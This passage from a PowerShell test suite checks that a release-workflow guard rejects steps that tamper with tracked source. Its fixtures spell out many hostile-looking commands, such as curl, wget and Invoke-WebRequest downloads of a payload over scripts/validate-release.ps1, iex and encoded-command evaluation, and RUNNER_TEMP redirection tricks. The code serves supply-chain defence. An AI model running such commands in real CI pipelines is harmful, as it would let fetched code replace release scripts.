    $finalValidResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'final-valid-source.yml'; Text = $finalValidFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('final-valid-source.yml/future-consumer'))
    if ($finalValidResult.Count -ne 1 -or $finalValidResult[0].Scripts -notcontains $script) {
        throw 'An unconditional final checkout pinned to github.sha must restore the effective source state before script invocation.'
    }

    $conditionalValidFixture = New-WorkflowScriptConsumerFixture -ScriptPath $script -SecondCheckoutOrder 'after-download' -ConditionalSecondCheckout
    $conditionalValidResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'conditional-valid-source.yml'; Text = $conditionalValidFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('conditional-valid-source.yml/future-consumer'))
    if ($conditionalValidResult.Count -ne 1 -or $conditionalValidResult[0].Scripts -notcontains $script) {
        throw 'A conditional checkout to the already-pinned repository, revision, and root path must preserve the effective source state.'
    }

    $conditionalShell = @'
if [ -n "$GITHUB_SHA" ]; then
  git checkout main
fi
'@
    $shellMutationCases = @(
        @{ Name = 'shell checkout before artifact download'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsBeforeDownload @(@{ Name = 'Replace source'; Text = 'git checkout main' })) },
        @{ Name = 'shell checkout after artifact download'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Replace source'; Text = 'git checkout main' })) },
        @{ Name = 'shell switch after artifact download'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Switch source'; Text = 'git switch main' })) },
        @{ Name = 'fetch and checkout command chain'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Fetch and switch'; Text = 'git fetch origin main; git checkout FETCH_HEAD' })) },
        @{ Name = 'git -C workspace checkout'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Replace source'; Text = 'git -C "$env:GITHUB_WORKSPACE" checkout main' })) },
        @{ Name = 'conditional workflow shell step'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Conditional replace'; If = $true; Text = 'git checkout main' })) },
        @{ Name = 'conditional command inside shell'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Conditional replace'; Shell = 'bash'; Text = $conditionalShell })) },
        @{ Name = 'unsupported Git checkout alias'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Replace source'; Text = 'git co main' })) },
        @{ Name = 'unsupported Git ref mutation'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Replace source'; Text = 'git update-ref refs/heads/main FETCH_HEAD' })) },
        @{ Name = 'shell checkout between guarded invocations'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -SecondInvocation -RunsBetweenInvocations @(@{ Name = 'Replace source'; Text = 'git checkout main' })) },
        @{ Name = 'conditional pinned shell checkout cannot restore invalid state'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Replace source'; Text = 'git checkout main' }, @{ Name = 'Conditional restore'; If = $true; Text = 'git checkout --detach ''${{ github.sha }}''' })) },
        @{ Name = 'non-root shell checkout cannot restore source'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Replace source'; Text = 'git checkout main' }, @{ Name = 'Wrong-root restore'; WorkingDirectory = 'source'; Text = 'git checkout --detach ''${{ github.sha }}''' })) },
        @{ Name = 'continue-on-error shell checkout cannot restore source'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Replace source'; Text = 'git checkout main' }, @{ Name = 'Ignored restore failure'; ContinueOnError = 'true'; Text = 'git checkout --detach ''${{ github.sha }}''' })) },
        @{ Name = 'continue-on-error shell checkout cannot preserve valid source'; Text = (New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = 'Ignored restore failure'; ContinueOnError = 'true'; Text = 'git checkout --detach ''${{ github.sha }}''' })) },
        @{ Name = 'continue-on-error action checkout cannot restore source'; Text = (New-WorkflowScriptConsumerFixture -ScriptPath $script -SecondCheckoutOrder 'after-download' -SecondCheckoutRef 'main' -FinalValidCheckout -FinalCheckoutContinueOnError 'true') }
    )
    foreach ($case in $shellMutationCases) {
        $rejected = $false
        try {
            $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'shell-mutation.yml'; Text = $case.Text }) -RepositoryRoot $RepositoryRoot
        }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract accepted $($case.Name)." }
    }

    $bashContinuation = [char]92 + [Environment]::NewLine
    $powerShellContinuation = [char]96 + [Environment]::NewLine
    $workspaceWriteCases = @(
        @{ Name = 'curl -o root tracked response'; Text = 'curl https://host/payload -o CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'curl bundled short response options to root'; Text = 'curl -fsSLoCHANGELOG.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl executable alias bundled response to nested'; Text = 'curl.exe -fsSLo src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl bundled short dump-header option to nested path'; Text = 'curl -fsSLDsrc/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl bundled short cookie-jar option to root'; Text = 'curl -fsSLcCHANGELOG.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl continued bundled short response options to nested'; Text = ('curl -fsSL' + $bashContinuation + '  -osrc/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'); Shell = 'bash' },
        @{ Name = 'curl dump-header root response'; Text = 'curl --dump-header CHANGELOG.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl dump-header nested response'; Text = 'curl --dump-header=src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl stderr root response'; Text = 'curl --stderr CHANGELOG.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl stderr nested response'; Text = 'curl --stderr=src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl alt-svc cache to root'; Text = 'curl --alt-svc CHANGELOG.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl ETag save to nested path'; Text = 'curl --etag-save=src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl HSTS cache to nested path'; Text = 'curl --hsts src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl trace short option to root'; Text = 'curl -sSLDCHANGELOG.md https://host/payload --trace-ascii scripts/validate-release.ps1'; Shell = 'bash' },
        @{ Name = 'curl write-out file sink to nested path'; Text = 'curl -w "%output{src/KeelMatrix.PackageSurface.Cli/README.md}" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl continued write-out file sink to root'; Text = ('curl --write-out ' + $bashContinuation + '  ''%output{CHANGELOG.md}'' https://host/payload'); Shell = 'bash' },
        @{ Name = 'curl write-out format loaded from a file'; Text = 'curl --write-out @workflow-format.txt https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl --output nested tracked response'; Text = 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl --output equals quoted root response'; Text = 'curl https://host/payload --output="CHANGELOG.md"'; Shell = 'bash' },
        @{ Name = 'curl attached -o nested response'; Text = 'curl -osrc/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl remote-name response'; Text = 'curl -O https://host/validate-release.ps1'; Shell = 'bash' },
        @{ Name = 'curl output directory with remote name'; Text = 'curl --output-dir "$GITHUB_WORKSPACE/scripts" -O https://host/validate-release.ps1'; Shell = 'bash' },
        @{ Name = 'curl config input with hidden root response output'; Text = 'curl --config .curlrc https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl config equals form with hidden nested response output'; Text = 'curl --config=.curlrc https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl short config option with hidden response output'; Text = 'curl -K .curlrc https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl bundled short config option with hidden response output'; Text = 'curl -fsSK.curlrc https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl config from runner temp remains unsupported'; Text = 'curl --config "${{ runner.temp }}/curlrc" https://host/payload'; Shell = 'bash' },
        @{ Name = 'quoted bash command hides root curl writer'; Text = "bash -c 'curl --output CHANGELOG.md https://host/payload'"; Shell = 'bash' },
        @{ Name = 'quoted login shell command hides nested curl writer'; Text = 'sh -lc "curl --dump-header src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload"'; Shell = 'bash' },
        @{ Name = 'PowerShell command evaluation hides response writer'; Text = "pwsh -Command 'Invoke-WebRequest -Uri https://host/payload -OutFile CHANGELOG.md'"; Shell = 'pwsh' },
        @{ Name = 'PowerShell short command option hides nested writer'; Text = "pwsh -c 'Set-Content -Path CHANGELOG.md -Value payload'"; Shell = 'pwsh' },
        @{ Name = 'PowerShell command-with-args evaluation is unsupported'; Text = "pwsh -CommandWithArgs 'Set-Content -Path CHANGELOG.md -Value payload'"; Shell = 'pwsh' },
        @{ Name = 'PowerShell encoded command is unsupported'; Text = 'powershell -EncodedCommand SQBFAFgA'; Shell = 'pwsh' },
        @{ Name = 'PowerShell Invoke-Expression hides root writer'; Text = "Invoke-Expression 'Set-Content -Path CHANGELOG.md -Value payload'"; Shell = 'pwsh' },
        @{ Name = 'PowerShell iex evaluates dynamic command'; Text = 'iex $env:COMMAND'; Shell = 'pwsh' },
        @{ Name = 'PowerShell quoted call operator hides root writer'; Text = "& 'Set-Content' -Path CHANGELOG.md -Value payload"; Shell = 'pwsh' },
        @{ Name = 'PowerShell quoted process call hides nested writer'; Text = "& 'pwsh' -Command 'Copy-Item source src/KeelMatrix.PackageSurface.Cli/README.md'"; Shell = 'pwsh' },
        @{ Name = 'conditional shell eval is unsupported'; Text = 'if eval "$COMMAND"; then printf done; fi'; Shell = 'bash' },
        @{ Name = 'nested cmd command is unsupported'; Text = 'cmd /c copy payload CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'nested Python evaluator is unsupported'; Text = 'python -c "open(\"CHANGELOG.md\", \"w\").write(\"payload\")"'; Shell = 'bash' },
        @{ Name = 'PowerShell process launch is unsupported'; Text = 'Start-Process pwsh -ArgumentList "-Command Set-Content CHANGELOG.md payload"'; Shell = 'pwsh' },
        @{ Name = 'wget -O root tracked response'; Text = 'wget https://host/payload -O CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'wget bundled short response options to root'; Text = 'wget -qOCHANGELOG.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget executable alias bundled response to nested'; Text = 'wget.exe -qO src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget output log to nested tracked file'; Text = 'wget --output-file=src/KeelMatrix.PackageSurface.Cli/README.md -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget log outside workspace still downloads response in workspace'; Text = 'wget --output-file="${{ runner.temp }}/wget.log" https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget append log to root tracked file'; Text = 'wget -a CHANGELOG.md -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget cookie save to nested tracked file'; Text = 'wget --save-cookies=src/KeelMatrix.PackageSurface.Cli/README.md -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget WARC output to root tracked file'; Text = 'wget --warc-file CHANGELOG.md -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget WARC temp directory under nested tracked tree'; Text = 'wget --warc-tempdir src/KeelMatrix.PackageSurface.Cli -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget cookie sink with dash destination'; Text = 'wget --save-cookies - -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget output log with dash destination'; Text = 'wget --output-file=- -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget CDX output with implicit file name'; Text = 'wget --warc-cdx -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget continued output-document to nested path'; Text = ('wget --quiet' + $bashContinuation + '  --output-document src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'); Shell = 'bash' },
        @{ Name = 'wget output-document nested response'; Text = 'wget --output-document=src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'Invoke-WebRequest OutFile root response'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFile CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'Invoke-WebRequest unique OutFile parameter prefix to root'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutF CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'Invoke-WebRequest unique OutFile prefix equals nested'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFi=src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
        @{ Name = 'Invoke-WebRequest unique OutFile prefix colon root'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFil:CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'module-qualified Invoke-WebRequest response to nested'; Text = 'Microsoft.PowerShell.Utility\Invoke-WebRequest -Uri https://host/payload -OutFile src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
        @{ Name = 'module-qualified Invoke-RestMethod response to root'; Text = 'Microsoft.PowerShell.Utility\Invoke-RestMethod -Uri https://host/payload -OutFile CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'quoted module-qualified Invoke-WebRequest response to root'; Text = '& ''Microsoft.PowerShell.Utility\Invoke-WebRequest'' -Uri https://host/payload -OutFile CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'continued module-qualified response to nested'; Text = ('Microsoft.PowerShell.Utility\Invoke-WebRequest -Uri https://host/payload ' + $powerShellContinuation + '  -OutFile src/KeelMatrix.PackageSurface.Cli/README.md'); Shell = 'pwsh' },
        @{ Name = 'continued abbreviated response parameter to root'; Text = ('Invoke-WebRequest -Uri https://host/payload ' + $powerShellContinuation + '  -OutFi CHANGELOG.md'); Shell = 'pwsh' },
        @{ Name = 'Invoke-WebRequest equals OutFile nested response'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFile=src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
        @{ Name = 'Invoke-WebRequest colon OutFile root response'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFile:scripts/validate-release.ps1'; Shell = 'pwsh' },
        @{ Name = 'Invoke-RestMethod OutFile nested response'; Text = 'Invoke-RestMethod -Uri https://host/payload -OutFile src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
        @{ Name = 'irm OutFile root response'; Text = 'irm -Uri https://host/payload -OutFile scripts/validate-release.ps1'; Shell = 'pwsh' },
        @{ Name = 'Bash RUNNER_TEMP reassigned to workspace root'; Text = 'RUNNER_TEMP="$GITHUB_WORKSPACE"; cp source "$RUNNER_TEMP/CHANGELOG.md"'; Shell = 'bash' },
        @{ Name = 'curl uses mutable Bash RUNNER_TEMP'; Text = 'RUNNER_TEMP="$GITHUB_WORKSPACE"; curl --output "$RUNNER_TEMP/CHANGELOG.md" https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget uses mutable Bash RUNNER_TEMP'; Text = 'RUNNER_TEMP="$GITHUB_WORKSPACE"; wget --output-document "$RUNNER_TEMP/src/KeelMatrix.PackageSurface.Cli/README.md" https://host/payload'; Shell = 'bash' },
        @{ Name = 'Bash RUNNER_TEMP reassigned to nested tracked path'; Text = 'RUNNER_TEMP="$GITHUB_WORKSPACE"; cp source "$RUNNER_TEMP/src/KeelMatrix.PackageSurface.Cli/README.md"'; Shell = 'bash' },
        @{ Name = 'PowerShell RUNNER_TEMP reassigned to workspace root'; Text = '$env:RUNNER_TEMP = "$env:GITHUB_WORKSPACE"; Copy-Item source "$env:RUNNER_TEMP/CHANGELOG.md"'; Shell = 'pwsh' },
        @{ Name = 'PowerShell RUNNER_TEMP reassigned to nested tracked path'; Text = '$env:RUNNER_TEMP = "$env:GITHUB_WORKSPACE"; Invoke-WebRequest -Uri https://host/payload -OutFile "$env:RUNNER_TEMP/src/KeelMatrix.PackageSurface.Cli/README.md"'; Shell = 'pwsh' },
        @{ Name = 'git diff output option to root tracked file'; Text = 'git diff --output=scripts/validate-release.ps1' },
        @{ Name = 'git diff output option with separate nested tracked path'; Text = 'git diff --output src/KeelMatrix.PackageSurface.Cli/README.md' },
        @{ Name = 'git diff quoted output option to root tracked file'; Text = 'git diff --output="scripts/validate-release.ps1"' },
        @{ Name = 'git show output option with separate root tracked path'; Text = 'git show HEAD --output scripts/validate-release.ps1' },
        @{ Name = 'git show output option to nested tracked file'; Text = 'git show HEAD --output=src/KeelMatrix.PackageSurface.Cli/README.md' },
        @{ Name = 'git status redirected to root tracked file'; Text = 'git status --short > scripts/validate-release.ps1' },
        @{ Name = 'shell append redirection to nested tracked file'; Text = 'printf payload >> src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'shell stderr redirection to root tracked file'; Text = 'printf payload 2> scripts/validate-release.ps1'; Shell = 'bash' },
        @{ Name = 'shell combined redirection to nested tracked file'; Text = 'printf payload &> src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'shell append combined redirection to root tracked file'; Text = 'printf payload &>> scripts/validate-release.ps1'; Shell = 'bash' },
        @{ Name = 'PowerShell redirection to root tracked file'; Text = 'Write-Output payload > scripts/validate-release.ps1'; Shell = 'pwsh' },
        @{ Name = 'PowerShell redirection after quoted Windows path ending in backslash'; Text = 'Write-Output payload "C:\folder\" > scripts/validate-release.ps1'; Shell = 'pwsh' },
        @{ Name = 'PowerShell append redirection to nested tracked file'; Text = 'Write-Output payload >> src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
        @{ Name = 'PowerShell all-stream redirection to root tracked file'; Text = 'Write-Output payload *> scripts/validate-release.ps1'; Shell = 'pwsh' },
        @{ Name = 'dynamic redirection destination'; Text = 'Write-Output payload > $env:TARGET'; Shell = 'pwsh' },
        @{ Name = 'workspace-variable redirection destination'; Text = 'printf payload > "$GITHUB_WORKSPACE/scripts/validate-release.ps1"'; Shell = 'bash' },
        @{ Name = 'Copy-Item to root tracked file'; Text = 'Copy-Item source scripts/validate-release.ps1'; Shell = 'pwsh' },
        @{ Name = 'cp to nested tracked file'; Text = 'cp source src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'Set-Content to root tracked file'; Text = 'Set-Content -Path scripts/validate-release.ps1 -Value payload'; Shell = 'pwsh' },
        @{ Name = 'Set-Content equals-form path option to nested tracked file'; Text = 'Set-Content -Path="src/KeelMatrix.PackageSurface.Cli/README.md" -Value payload'; Shell = 'pwsh' },
        @{ Name = 'Add-Content to nested tracked file'; Text = 'Add-Content -LiteralPath src/KeelMatrix.PackageSurface.Cli/README.md -Value payload'; Shell = 'pwsh' },
        @{ Name = 'Out-File to nested tracked file'; Text = 'Out-File -FilePath src/KeelMatrix.PackageSurface.Cli/README.md -InputObject payload'; Shell = 'pwsh' },
        @{ Name = 'New-Item to root tracked file'; Text = 'New-Item -ItemType File -Path scripts/validate-release.ps1 -Force'; Shell = 'pwsh' },
        @{ Name = 'Remove-Item from nested tracked file'; Text = 'Remove-Item -LiteralPath src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
        @{ Name = 'touch nested tracked file'; Text = 'touch src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'sed in-place edit to root tracked file'; Text = 'sed -i s/old/new/ scripts/validate-release.ps1'; Shell = 'bash' },
        @{ Name = 'dynamic direct-writer destination'; Text = 'Copy-Item source $env:TARGET'; Shell = 'pwsh' },
        @{ Name = 'dynamic abbreviated PowerShell response destination'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutF $env:TARGET'; Shell = 'pwsh' },
        @{ Name = 'dynamic curl response destination'; Text = 'curl --output "$RUNNER_TEMP/$RELATIVE_PATH" https://host/payload'; Shell = 'bash' },
        @{ Name = 'dynamic curl dump-header destination'; Text = 'curl --dump-header "$TARGET" https://host/payload'; Shell = 'bash' },
        @{ Name = 'dynamic curl write-out destination'; Text = 'curl --write-out "%output{$env:TARGET}" https://host/payload'; Shell = 'bash' },
        @{ Name = 'dynamic wget response destination'; Text = 'wget --output-document "$RUNNER_TEMP/$RELATIVE_PATH" https://host/payload'; Shell = 'bash' },
        @{ Name = 'dynamic wget WARC temp directory'; Text = 'wget --warc-tempdir "$RUNNER_TEMP/$RELATIVE_PATH" -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'GNU time output option to tracked root'; Text = 'time -o CHANGELOG.md printf payload'; Shell = 'bash' },
        @{ Name = 'GNU time equals output option to nested tracked file'; Text = 'time --output=src/KeelMatrix.PackageSurface.Cli/README.md printf payload'; Shell = 'bash' },
        @{ Name = 'GNU time separate long output option to tracked root'; Text = 'time --output CHANGELOG.md printf payload'; Shell = 'bash' },
        @{ Name = 'GNU time attached output option to tracked root'; Text = 'time -oCHANGELOG.md printf payload'; Shell = 'bash' },
        @{ Name = 'absolute GNU time output option to tracked root'; Text = '/usr/bin/time -o CHANGELOG.md printf payload'; Shell = 'bash' },
        @{ Name = 'ambiguous PowerShell Out parameter prefix'; Text = 'Invoke-WebRequest -Uri https://host/payload -Out CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'dynamic Git output destination'; Text = 'git diff --output=$env:TARGET'; Shell = 'pwsh' },
        @{ Name = 'single-quoted runner-temp-looking destination'; Text = 'Copy-Item source ''$RUNNER_TEMP/package-surface.txt'''; Shell = 'bash' },
        @{ Name = 'runner-temp path that traverses out of the temporary directory'; Text = 'cp source "$RUNNER_TEMP/../PackageSurface/scripts/validate-release.ps1"'; Shell = 'bash' },
        @{ Name = 'immutable runner-temp expression that traverses into workspace'; Text = 'cp source "${{ runner.temp }}/../PackageSurface/scripts/validate-release.ps1"'; Shell = 'bash' },
        @{ Name = 'dynamic runner-temp suffix'; Text = 'cp source "$RUNNER_TEMP/$RELATIVE_PATH"'; Shell = 'bash' },
        @{ Name = 'unsupported direct-writer destination'; Text = 'cp source'; Shell = 'bash' }
    )
    foreach ($case in $workspaceWriteCases) {
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            $runStep = @{ Name = $case.Name; Text = $case.Text }
            if ($case.ContainsKey('Shell')) { $runStep.Shell = $case.Shell }
            $fixtureArguments = @{ ScriptPath = $script }
            if ($position -eq 'before artifact download') { $fixtureArguments.RunsBeforeDownload = @($runStep) }
            elseif ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = @($runStep) }
            else {
                $fixtureArguments.SecondInvocation = $true
                $fixtureArguments.RunsBetweenInvocations = @($runStep)
            }
            $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
            $rejected = $false
            try {
                $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'workspace-write.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot
            }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position." }
        }
    }

    $writeThenPinnedShellCheckoutCases = @(
        @{ Name = 'pinned detached checkout'; Text = ('git checkout --detach ''' + [char]36 + '{{ github.sha }}' + '''') },
        @{ Name = 'pinned detached switch'; Text = ('git switch --detach ''' + [char]36 + '{{ github.sha }}' + '''') }
    )
    $responseWriteThenCheckoutCases = @(
        @{ Name = 'direct copy writer'; Text = ('cp source ' + $script); Shell = 'bash' },
        @{ Name = 'bundled curl response writer'; Text = 'curl -fsSLoCHANGELOG.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl dump-header writer'; Text = 'curl -fsSLDsrc/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget bundled response writer'; Text = 'wget -qOCHANGELOG.md https://host/payload'; Shell = 'bash' },
        @{ Name = 'PowerShell alias with abbreviated response parameter'; Text = 'iwr -Uri https://host/payload -OutF CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'module-qualified PowerShell response writer'; Text = 'Microsoft.PowerShell.Utility\Invoke-WebRequest -Uri https://host/payload -OutFi CHANGELOG.md'; Shell = 'pwsh' }
    )
    foreach ($restoreCase in $writeThenPinnedShellCheckoutCases) {
        foreach ($writeCase in $responseWriteThenCheckoutCases) {
            foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
                $writeStep = @{ Name = $writeCase.Name; Text = $writeCase.Text; Shell = $writeCase.Shell }
                $restoreStep = @{ Name = $restoreCase.Name; Text = $restoreCase.Text; Shell = $writeCase.Shell }
                $fixtureArguments = @{ ScriptPath = $script }
                if ($position -eq 'before artifact download') { $fixtureArguments.RunsBeforeDownload = @($writeStep, $restoreStep) }
                elseif ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = @($writeStep, $restoreStep) }
                else {
                    $fixtureArguments.SecondInvocation = $true
                    $fixtureArguments.RunsBetweenInvocations = @($writeStep, $restoreStep)
                }
                $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
                $rejected = $false
                try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'write-then-shell-checkout.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
                catch { $rejected = $true }
                if (-not $rejected) { throw "Pinned shell $($restoreCase.Name) falsely restored $($writeCase.Name) $position." }
            }
        }
    }
    $runnerTempExpression = ([char]36).ToString() + '{{runner.temp}}'
    $runnerTempSpacedExpression = ([char]36).ToString() + '{{ runner.temp }}'
    $safeExternalWriteCases = @(
        @{ Name = 'Git output outside workspace'; Text = 'git diff --output=' + $runnerTempExpression + '/package-surface.patch'; Shell = 'bash' },
        @{ Name = 'Quoted Git output outside workspace'; Text = 'git diff --output "' + $runnerTempSpacedExpression + '/package-surface.patch"'; Shell = 'bash' },
        @{ Name = 'Quoted Git output compact expression'; Text = 'git diff --output "' + $runnerTempExpression + '/package-surface.patch"'; Shell = 'bash' },
        @{ Name = 'Shell output outside workspace'; Text = 'printf payload > "${{ runner.temp }}/package-surface.txt"'; Shell = 'bash' },
        @{ Name = 'Copy outside workspace'; Text = 'Copy-Item source "${{ runner.temp }}/package-surface.txt"'; Shell = 'pwsh' },
        @{ Name = 'Copy through a normalized runner-temp suffix'; Text = 'Copy-Item source "${{ runner.temp }}/cache/../package-surface.txt"'; Shell = 'pwsh' },
        @{ Name = 'Named copy destination outside workspace'; Text = 'Copy-Item source -Destination "${{ runner.temp }}/package-surface.txt"'; Shell = 'pwsh' },
        @{ Name = 'curl response outside workspace'; Text = 'curl --output "${{ runner.temp }}/payload.txt" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl bundled options with response outside workspace'; Text = 'curl -fsSL -o "${{ runner.temp }}/payload.txt" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl dump-header outside workspace'; Text = 'curl --dump-header "${{ runner.temp }}/headers.txt" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl stderr outside workspace'; Text = 'curl --stderr "${{ runner.temp }}/curl.log" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl alt-svc outside workspace'; Text = 'curl --alt-svc "${{ runner.temp }}/alt-svc.txt" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl ETag save outside workspace'; Text = 'curl --etag-save "${{ runner.temp }}/etag.txt" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl HSTS outside workspace'; Text = 'curl --hsts "${{ runner.temp }}/hsts.txt" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl cookie jar outside workspace'; Text = 'curl --cookie-jar "${{ runner.temp }}/cookies.txt" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl libcurl output outside workspace'; Text = 'curl --libcurl "${{ runner.temp }}/generated.c" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl trace output outside workspace'; Text = 'curl --trace "${{ runner.temp }}/trace.txt" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl trace-ascii output outside workspace'; Text = 'curl --trace-ascii "${{ runner.temp }}/trace-ascii.txt" https://host/payload'; Shell = 'bash' },
        @{ Name = 'curl write-out file sink outside workspace'; Text = 'curl --write-out "%output{${{ runner.temp }}/stats.txt}" https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget response outside workspace'; Text = 'wget --output-document "${{ runner.temp }}/payload.txt" https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget cookie save outside workspace'; Text = 'wget --save-cookies "${{ runner.temp }}/cookies.txt" -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget WARC output outside workspace'; Text = 'wget --warc-file "${{ runner.temp }}/capture" -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget WARC temp directory outside workspace'; Text = 'wget --warc-tempdir "${{ runner.temp }}/warc-tmp" -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'wget log outside workspace with response to stdout'; Text = 'wget --output-file "${{ runner.temp }}/wget.log" -O - https://host/payload'; Shell = 'bash' },
